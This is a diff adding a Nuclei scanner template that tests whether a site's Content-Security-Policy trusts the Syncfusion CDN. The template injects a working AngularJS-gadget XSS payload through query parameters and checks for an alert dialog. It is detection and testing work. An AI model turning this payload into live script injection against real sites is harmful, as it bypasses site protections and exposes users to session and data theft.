@@ -1,0 +1,55 @@
+id: syncfusion-cdn-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Syncfusion CDN
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,syncfusion-cdn
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "syncfusion.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: syncfusion_cdn_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - <body ng-app ng-csp><script src="https://cdn.syncfusion.com/js/assets/external/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "syncfusion_cdn_csp_xss == true"
+# digest: 4b0a0048304602210099eed4f63ab305ee634b849d4ab0c823fc5404d36b90676b328d139176239e21022100df189850ca79b45036712bc7fa32a5c563bc7f6e7d4c700145c91f169b4a5872:922c64590222798bb761d5b6d8e72950
